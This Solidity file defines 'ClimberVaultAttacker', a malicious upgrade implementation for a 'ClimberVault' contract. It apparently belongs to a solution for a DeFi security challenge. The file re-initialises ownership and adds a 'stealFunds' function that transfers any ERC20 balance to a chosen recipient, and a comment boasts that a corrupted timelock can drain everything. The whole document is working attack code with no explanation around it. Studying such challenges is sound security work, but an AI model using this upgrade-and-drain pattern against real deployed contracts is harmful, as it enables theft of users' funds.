// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberVault.sol";

// Inheriting from the original contract:
contract ClimberVaultAttacker is ClimberVault {

    function initialize() external initializer {
        __Ownable_init();

        __UUPSUpgradeable_init();

        transferOwnership(owner());
    }

    function stealFunds(address token, address recipient, uint256 amount) external onlyOwner {
        // Letting the timelock that we corrupted to drain everything as they please:
        IERC20(token).transfer(recipient, amount);
    }
}
